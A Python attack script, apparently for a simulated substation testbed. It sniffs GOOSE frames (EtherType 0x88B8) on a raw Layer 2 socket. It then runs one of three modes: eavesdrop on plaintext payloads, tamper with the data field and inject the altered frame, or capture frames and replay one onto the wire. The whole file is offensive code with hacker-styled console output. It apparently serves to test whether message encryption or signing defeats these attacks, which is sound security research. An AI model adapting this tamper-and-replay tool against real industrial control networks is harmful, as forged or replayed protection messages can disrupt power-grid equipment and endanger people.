#!/usr/bin/env python3
import json
import time
import argparse
import socket

parser = argparse.ArgumentParser(description="Layer 2 GOOSE Adversary (Raw Sockets)")
parser.add_argument("--attack", type=str, choices=['eavesdrop', 'tamper', 'replay'], default='eavesdrop')
args = parser.parse_args()

GOOSE_TYPE = 0x88B8
IFACE = "h3-eth0"

captured_raw_frames = []

def start_hacker():
    print(f"[*] HACKER TERMINAL ONLINE | Interface: {IFACE}")
    print(f"[*] Attack Mode: {args.attack.upper()}")
    
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(GOOSE_TYPE))
        sock.bind((IFACE, 0))
    except PermissionError:
        print("[!] Error: Raw sockets require root/sudo privileges.")
        return

    while True:
        raw_frame = sock.recv(2048)
        eth_header = raw_frame[:14]
        payload_bytes = raw_frame[14:]
        
        try:
            payload = json.loads(payload_bytes.decode('utf-8', errors='ignore'))
            
            if payload.get("attacker_injected"):
                continue
                
            print(f"\n[!!!] INTERCEPTED GOOSE FRAME [!!!]")
            
            if args.attack == 'eavesdrop':
                if payload.get("algo") != "None (Plaintext)":
                    print("    [?] Status: SECURE. Payload is encrypted/signed.")
                else:
                    print("    [!] Status: VULNERABLE. Plaintext detected. I can read the GOOSE data!")

            elif args.attack == 'tamper':
                original_data = payload.get("data", "")
                if len(original_data) > 4:
                    payload["data"] = original_data[:-4] + "dead"
                    payload["attacker_injected"] = True
                    
                    poisoned_frame = eth_header + json.dumps(payload).encode('utf-8')
                    time.sleep(0.005) 
                    sock.send(poisoned_frame)
                    print("    [+] Poisoned frame injected onto the wire!")

            elif args.attack == 'replay':
                captured_raw_frames.append(raw_frame)
                print(f"[>] REPLAY: Packet captured. Stored: {len(captured_raw_frames)}")
                
                if len(captured_raw_frames) == 6:
                    print("    [+] Injecting Replay Attack! Blasting command again...")
                    time.sleep(0.05)
                    sock.send(captured_raw_frames[-1])
                    print("    [+] Replay frame successfully blasted onto the wire!")

        except json.JSONDecodeError:
            pass

if __name__ == "__main__":
    start_hacker()
